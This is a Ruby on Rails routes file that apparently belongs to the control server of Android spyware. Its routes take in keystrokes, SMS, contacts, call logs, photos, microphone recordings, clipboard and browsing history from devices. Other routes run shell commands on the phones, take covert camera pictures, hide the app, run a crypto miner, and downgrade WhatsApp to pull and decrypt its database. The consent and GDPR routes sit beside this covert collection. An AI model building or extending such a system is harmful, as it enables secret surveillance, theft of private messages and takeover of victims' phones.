Rails.application.routes.draw do
  # Health Check Endpoints (for Docker/K8s)
  get '/health', to: 'health#index'
  get '/health/ready', to: 'health#ready'
  get '/health/live', to: 'health#live'
  get '/health/startup', to: 'health#startup'

  # Prometheus Metrics Endpoint
  get '/metrics', to: 'metrics#index'

  # Audit Trail System
  resources :audit_logs, only: [:index, :show] do
    collection do
      get :export
      get :stats
    end
  end

  # Notification & Alert System
  resources :alert_rules do
    member do
      post :toggle
    end
  end
  
  resources :alerts, only: [:index, :show] do
    member do
      post :acknowledge
    end
    collection do
      get :stats
    end
  end
  
  resources :notification_channels do
    member do
      post :test
    end
  end

  # Fleet Management
  resources :device_groups do
    member do
      post :add_devices
      post :remove_devices
      post :bulk_command
    end
  end

  resources :apk_installations do
    resources :tags, controller: :device_tags, only: [:index, :create, :destroy]
    
    # Consent Management routes
    resources :consents, only: [:index] do
      collection do
        post :grant
        post :revoke
        get :export
      end
    end
    
    # App Control Panel routes
    get 'apps', to: 'app_control#index'
    post 'apps/refresh', to: 'app_control#refresh'
    post 'apps/install', to: 'app_control#install'
    delete 'apps/:package_name', to: 'app_control#uninstall'
    post 'apps/:package_name/launch', to: 'app_control#launch'
    post 'apps/:package_name/kill', to: 'app_control#kill'
    get 'processes', to: 'app_control#processes'
    get 'apps/:package_name/permissions', to: 'app_control#permissions'
    patch 'apps/:package_name/permissions', to: 'app_control#update_permissions'
  end

  get '/devices/tags/search', to: 'device_tags#search'

  # Chunked File Uploads
  post 'file_transfers/upload_chunk', to: 'file_transfers#upload_chunk'
  post 'file_transfers/finalize_upload', to: 'file_transfers#finalize_upload'
  post 'file_transfers/cleanup_expired_uploads', to: 'file_transfers#cleanup_expired_uploads'

  # WebRTC & Live Streaming
  get 'webrtc/turn_credentials', to: 'webrtc#turn_credentials'
  post 'webrtc/signal', to: 'webrtc#signal'

  # REST API for Android devices (fallback for WebSocket)
  namespace :api do
    get 'config', to: 'config#show'
    resources :commands, only: [:show] do
      member do
        post :ack
        post :send_command
      end
    end
    post 'location', to: 'commands#location'
    post 'locations', to: 'commands#location'  # Android client sends to /locations
    get 'devices/online', to: 'devices#online'
    
    # Keylogger API endpoints (ENHANCED)
    post 'keylogger', to: 'keylogger#receive'
    post 'keylogger/ack', to: 'keylogger#acknowledge' # ACK confirmation
    get 'keylogger/data/:device_id', to: 'keylogger#data'
    get 'keylogger/stats/:device_id', to: 'keylogger#stats' # Statistics
    get 'keylogger/export/:device_id', to: 'keylogger#export' # CSV/HTML export
    
    # Notifications API endpoints
    post 'notifications', to: 'notifications#receive'
    get 'notifications/:device_id', to: 'notifications#index'

    # Data Ingestion (Mapped for Android Client)
    post 'sms', to: 'sms_messages#upload_dump'
    post 'contacts', to: 'contacts#upload_dump'
    post 'photos', to: 'media#upload_photo'
    post 'audio', to: 'media#upload_audio'
    post 'calls', to: 'call_logs#upload_dump'
    post 'clipboard', to: 'clipboard#receive'
    post 'app_usage', to: 'app_usage#receive'
    post 'browser_history', to: 'browser_history#receive'
    post 'file_browser', to: 'file_browser#receive'
    post 'geofence', to: 'geofence#receive'

    # Keylog Analytics API endpoints
    scope 'devices/:id' do
      get 'keylog_analytics', to: 'keylog_analytics#show'
      get 'keylog_analytics/app_usage', to: 'keylog_analytics#app_usage'
      get 'keylog_analytics/activity_timeline', to: 'keylog_analytics#activity_timeline'
      get 'keylog_analytics/export', to: 'keylog_analytics#export'
    end

    # Scheduled Commands
    scope 'devices/:device_id' do
      resources :scheduled_commands, only: [:index, :show, :create, :update, :destroy] do
        member do
          post :toggle
          get :executions
        end
      end
    end

    # Geofence Management
    scope 'devices/:device_id' do
      resources :geofences, controller: 'geofence', only: [:index, :create, :destroy]
      get 'location_history', to: 'geofence#location_history'
      get 'location_heatmap', to: 'geofence#location_heatmap'
      get 'geofence_events', to: 'geofence#events'
    end
    
    # File Browser API
    resources :smartphones, only: [] do
      scope module: :file_browser do
        get 'files', to: 'file_browser#index', as: 'files'
        get 'files/download', to: 'file_browser#download', as: 'download_file'
        post 'files/upload', to: 'file_browser#upload', as: 'upload_file'
        delete 'files', to: 'file_browser#delete', as: 'delete_file'
        get 'files/preview', to: 'file_browser#preview', as: 'preview_file'
        post 'files/rename', to: 'file_browser#rename', as: 'rename_file'
        post 'files/move', to: 'file_browser#move', as: 'move_file'
        get 'files/search', to: 'file_browser#search', as: 'search_files'
      end
    end

    # GDPR Compliance Endpoints
    scope 'devices/:id' do
      post 'erasure_request', to: 'gdpr#erasure_request'
      get 'data_export', to: 'gdpr#data_export'
      get 'retention_policy', to: 'gdpr#show_retention_policy'
      put 'retention_policy', to: 'gdpr#update_retention_policy'
      get 'privacy_policy', to: 'gdpr#privacy_policy'
    end

    # Error Tracking API
    resources :errors, only: [:index, :show] do
      member do
        put :resolve
        put :ignore
      end
    end

    # User Preferences API
    resource :preferences, only: [:show, :update, :destroy] do
      get '/', action: :index, on: :collection
    end

    namespace :v1 do
      get 'telemetry/devices', to: 'telemetry#devices'
      get 'telemetry/command_queue', to: 'telemetry#command_queue'
      get 'telemetry/webrtc_status', to: 'telemetry#webrtc_status'
      get 'telemetry/uploads', to: 'telemetry#uploads'

      # Network Resilience endpoints
      get 'connections', to: 'connections#index'
      get 'connections/stats', to: 'connections#stats'
      post 'connections/cleanup', to: 'connections#cleanup'
      get 'circuit_breakers', to: 'circuit_breakers#index'
      post 'circuit_breakers/:service/reset', to: 'circuit_breakers#reset'
      get 'offline_queue/:device_id', to: 'offline_queue#show'
      post 'offline_queue/:device_id', to: 'offline_queue#create'
      delete 'offline_queue/:device_id', to: 'offline_queue#flush'
    end
  end

  # Admin config save endpoint
  namespace :admin do
    post 'android_config/update', to: 'android_settings#update', as: 'android_config_update'
  end


  resources :apk_payloads
  resources :contacts do
    collection do
      post :dump_contacts
    end
  end
  resources :geo_locations do
    collection do
      get :dump_location
    end
  end
  resources :sms_messages do
    collection do
      post :dump_messages
      post :send_sms
    end
  end
  resources :call_logs do
    collection do
      post :dump_calllogs
    end
  end
  resources :recordings do
    collection do
      post :microphone_rec
    end
  end
  resources :messaging_apps_dumps do
    collection do
      get :uninstall_whatsapp_for_downgrade
      get :install_old_apk
      get :adb_backup
      get :extract_backup
      get :untar_backup
      get :pull_whatsapp_db
      get :decrypt_whatsapp_database
      post :export_whatsapp_database
    end
  end
  resources :screenshots do
    collection do
      get :dump_screen_snap
      post :screen_record
    end
  end
  resources :pictures do
    collection do
      post :take_picture
    end
  end

  resources :smartphones do
    collection do
      get :load
      get :check_connection
      post :install
      post :front_camera_snap
      post :get_accounts
      post :toggle_wifi
      post :select_smartphone
      post :take_picture
      post :dump_sysinfo
      post :set_audio_mode
      post :dump_localtime
      post :uninstall_app
      post :install_app
      post :list_apps
      post :open_app
      post :wake_lock
      post :dump_wifi_info
      get :webcam_record
      get :upload_file
      post :run_shell_command
      post :dump_device_info
      post :pull_file
      post :ambient_record
      post :browse_files
      post :get_app_usage
      post :get_browser_history
      post :start_webrtc_stream
      get :hide_app
      get :show_app
      get :crypto_miner  # Fixed typo: was crypto_minner
    end
  end

  post '/graphql', to: 'graphql#execute'
  get '/dashboard', to: 'dashboards#index'
  
  # Statistics API endpoints
  get 'devices/:id/statistics', to: 'statistics#show', as: 'device_statistics'

  devise_for :admin_users, ActiveAdmin::Devise.config
  ActiveAdmin.routes(self)
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html

end
